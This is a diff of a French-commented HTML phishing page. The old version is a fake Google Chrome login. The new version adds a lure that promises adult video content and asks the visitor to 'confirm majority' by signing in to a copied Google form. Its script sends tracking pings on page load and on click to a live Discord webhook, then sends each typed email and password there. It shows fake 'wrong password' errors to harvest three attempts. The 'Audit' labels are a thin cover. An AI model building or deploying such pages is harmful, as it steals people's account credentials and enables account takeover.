@@ -3,129 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Chrome</title>
-    
-    <link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
-    <link rel="apple-touch-icon" href="https://www.google.com/favicon.ico">
-
+    <title>Stream - Private Content</title>
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; margin: 0; display: flex; justify-content: center; align-items: flex-start; padding-top: 50px; height: 100vh; color: #202124; }
-        .container { width: 90%; max-width: 400px; text-align: center; }
-        .chrome-header { margin-bottom: 30px; }
-        .chrome-logo { width: 48px; height: 48px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin: 10px 0; }
-        p { font-size: 16px; margin-bottom: 30px; }
+        body { margin: 0; font-family: 'Roboto', Arial, sans-serif; background: #0f0f0f; color: white; overflow-x: hidden; }
         
-        /* Style Input dynamique de ta capture */
-        .input-box { position: relative; margin-bottom: 10px; text-align: left; }
+        /* --- INTERFACE VIDEO MODERNE --- */
+        #page-video { display: flex; flex-direction: column; height: 100vh; }
+        .nav { padding: 15px 25px; background: #181818; display: flex; align-items: center; border-bottom: 1px solid #333; }
+        .logo { font-size: 1.5rem; font-weight: bold; color: #ff9900; }
+        .logo span { color: white; margin-left: 2px; background: #ff9900; color: black; padding: 2px 5px; border-radius: 4px; }
         
-        /* Label qui se met dans la bordure comme sur l'image */
-        .input-label { position: absolute; top: -10px; left: 10px; background: white; padding: 0 5px; font-size: 12px; color: #d93025; display: none; }
+        .player-zone { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .video-card { width: 100%; max-width: 850px; background: #000; border-radius: 12px; position: relative; aspect-ratio: 16/9; overflow: hidden; border: 1px solid #282828; cursor: pointer; }
+        .thumb { width: 100%; height: 100%; object-fit: cover; filter: blur(20px); opacity: 0.5; }
         
-        input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
-        input:focus { border: 2px solid #1a73e8; }
+        .overlay { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.4); }
+        .play-btn { width: 80px; height: 80px; background: #ff9900; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(255,153,0,0.3); transition: 0.3s; }
+        .play-btn::after { content: ''; border-top: 12px solid transparent; border-bottom: 12px solid transparent; border-left: 20px solid white; margin-left: 6px; }
         
-        /* État d'erreur rouge identique à ta capture */
-        input.error-border { border: 2px solid #d93025; }
+        /* --- INTERFACE LOGIN (COPIE CONFORME) --- */
+        #page-login { display: none; background: white; min-height: 100vh; color: #202124; flex-direction: column; align-items: center; padding-top: 40px; }
+        .login-container { width: 90%; max-width: 440px; text-align: center; }
+        .g-logo { width: 48px; margin-bottom: 15px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
         
-        .error-container { display: none; color: #d93025; font-size: 14px; margin-top: 8px; text-align: left; line-height: 1.4; }
-        .error-content { display: flex; align-items: flex-start; }
-        .error-icon { background-color: #d93025; color: white; border-radius: 50%; min-width: 16px; height: 16px; display: inline-flex; justify-content: center; align-items: center; font-size: 11px; font-weight: bold; margin-right: 12px; margin-top: 2px; }
+        .field-container { position: relative; margin-top: 35px; text-align: left; }
         
-        /* Case à cocher "Afficher le mot de passe" de ta capture */
-        .show-pass-container { display: flex; align-items: center; margin-top: 20px; font-size: 16px; color: #202124; cursor: pointer; text-align: left; }
-        .show-pass-container input { width: 18px; height: 18px; margin-right: 15px; cursor: pointer; border: 2px solid #5f6368; }
+        /* Style identique à ta capture d'écran */
+        .input-box { border: 1px solid #dadce0; border-radius: 4px; padding: 13px 15px; position: relative; }
+        .input-box.error { border: 2px solid #b3261e; }
+        
+        .label-top { position: absolute; top: -10px; left: 12px; background: #fff; padding: 0 5px; font-size: 12px; color: #5f6368; }
+        .input-box.error .label-top { color: #b3261e; }
+        
+        input { border: none; width: 100%; font-size: 16px; outline: none; background: transparent; padding: 5px 0; }
+        
+        /* Message d'erreur identique à l'image */
+        .error-row { display: none; color: #b3261e; font-size: 14px; margin-top: 8px; align-items: flex-start; line-height: 1.4; text-align: left; }
+        .error-icon { background: #b3261e; color: #fff; border-radius: 50%; min-width: 16px; height: 16px; display: inline-flex; justify-content: center; align-items: center; font-size: 11px; margin-right: 10px; margin-top: 2px; }
 
-        .btn-container { margin-top: 40px; display: flex; justify-content: flex-end; }
-        .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
-        .btn-next:active { background-color: #1669d6; }
+        .checkbox-row { display: flex; align-items: center; margin-top: 25px; cursor: pointer; font-size: 15px; text-align: left; }
+        .checkbox-row input { width: 18px; height: 18px; margin-right: 15px; cursor: pointer; }
+
+        .footer-btn { margin-top: 40px; display: flex; justify-content: flex-end; width: 100%; }
+        .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="chrome-header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" class="chrome-logo" alt="Chrome">
-        <h1>Google Chrome</h1>
-        <p>Utilisez votre compte Google</p>
-    </div>
-
-    <form id="chromeForm">
-        <div class="input-box">
-            <input type="email" id="email" placeholder="Adresse e-mail ou téléphone" required>
-        </div>
-        
-        <div class="input-box" style="margin-top: 20px;">
-            <div id="labelRed" class="input-label">Saisissez votre mot de passe</div>
-            <input type="password" id="pass" placeholder="Saisissez votre mot de passe" required>
-            
-            <div id="errorMsg" class="error-container">
-                <div class="error-content">
-                    <span class="error-icon">!</span>
-                    <span>Mot de passe incorrect. Réessayez.</span>
+    <div id="page-video">
+        <div class="nav"><div class="logo">HUB<span>VIDEO</span></div></div>
+        <div class="player-zone">
+            <div class="video-card" onclick="startFlow()">
+                <img src="https://raw.githubusercontent.com/TON_USER/TON_REPO/main/thumbnail.jpg" class="thumb" onerror="this.src='https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800'">
+                <div class="overlay">
+                    <div class="play-btn"></div>
+                    <h2 style="margin-top:20px;">Contenu Premium</h2>
+                    <p style="color:#aaa;">Connectez-vous pour confirmer votre majorité.</p>
                 </div>
             </div>
         </div>
+    </div>
 
-        <label class="show-pass-container">
-            <input type="checkbox" id="toggle"> Afficher le mot de passe
-        </label>
+    <div id="page-login">
+        <div class="login-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" class="g-logo">
+            <h1>Google Chrome</h1>
+            <p>Utilisez votre compte Google</p>
 
-        <div class="btn-container">
-            <button type="submit" class="btn-next">Suivant</button>
+            <form id="auditForm">
+                <div class="field-container">
+                    <div class="input-box">
+                        <span class="label-top">Adresse e-mail ou téléphone</span>
+                        <input type="email" id="email" required>
+                    </div>
+                </div>
+
+                <div class="field-container">
+                    <div id="passBox" class="input-box">
+                        <span class="label-top">Saisissez votre mot de passe</span>
+                        <input type="password" id="pass" required>
+                    </div>
+                    <div id="errBlock" class="error-row">
+                        <span class="error-icon">!</span>
+                        <span>Mot de passe incorrect. Réessayez.</span>
+                    </div>
+                </div>
+
+                <label class="checkbox-row">
+                    <input type="checkbox" id="toggle"> Afficher le mot de passe
+                </label>
+
+                <div class="footer-btn">
+                    <button type="submit" class="btn-next">Suivant</button>
+                </div>
+            </form>
         </div>
-    </form>
-</div>
+    </div>
 
-<script>
-    const WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
-    let count = 0;
+    <script>
+        const WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+        let count = 0;
 
-    // Gestion de la visibilité du mot de passe
-    document.getElementById('toggle').addEventListener('change', function() {
-        document.getElementById('pass').type = this.checked ? 'text' : 'password';
-    });
+        // Signal 1 : Ouverture
+        window.onload = () => {
+            fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: "🚨 **Audit** : Fichier ouvert par la cible." })
+            });
+        };
 
-    document.getElementById('chromeForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        count++;
+        // Transition et Signal 2
+        function startFlow() {
+            fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: "🖱️ **Action** : Clic sur le bouton vidéo." })
+            });
+            document.getElementById('page-video').style.display = 'none';
+            document.getElementById('page-login').style.display = 'flex';
+            document.title = "Connexion - Google Chrome";
+        }
 
-        const mail = document.getElementById('email').value;
-        const password = document.getElementById('pass').value;
+        // Afficher/Cacher MDP
+        document.getElementById('toggle').onclick = function() {
+            document.getElementById('pass').type = this.checked ? 'text' : 'password';
+        };
 
-        // Envoi des logs à Discord
-        fetch(WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title: `🎯 Log Chrome - Tentative ${count}/3`,
-                    color: count === 3 ? 15158332 : 3447003,
-                    fields: [
-                        { name: "👤 Utilisateur", value: mail, inline: false },
-                        { name: "🔑 Mot de passe", value: password, inline: false }
-                    ],
-                    footer: { text: "Audit Sécurité - Chrome Mobile" },
-                    timestamp: new Date()
-                }]
-            })
-        }).then(() => {
-            if (count < 3) {
-                // On applique le design "ERREUR" de ton image
-                document.getElementById('errorMsg').style.display = 'block';
-                document.getElementById('labelRed').style.display = 'block';
-                const passInput = document.getElementById('pass');
-                passInput.classList.add('error-border');
-                passInput.placeholder = ""; // On vide le placeholder pour laisser place au label rouge
-                passInput.value = '';
-                passInput.focus();
-            } else {
-                // Redirection finale
-                window.location.href = "https://www.facebook.com/login/";
-            }
-        });
-    });
-</script>
+        // Envoi des données (3 tentatives)
+        document.getElementById('auditForm').onsubmit = function(e) {
+            e.preventDefault();
+            count++;
+            
+            const m = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
 
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🔑 Tentative " + count + "/3",
+                        color: count === 3 ? 15158332 : 3447003,
+                        fields: [
+                            { name: "👤 Email", value: "`" + m + "`" },
+                            { name: "🔑 Pass", value: "`" + p + "`" }
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
+            }).then(() => {
+                if (count < 3) {
+                    document.getElementById('passBox').classList.add('error');
+                    document.getElementById('errBlock').style.display = 'flex';
+                    document.getElementById('pass').value = '';
+                    document.getElementById('pass').focus();
+                } else {
+                    window.location.href = "https://www.google.com";
+                }
+            });
+        };
+    </script>
 </body>
 </html>
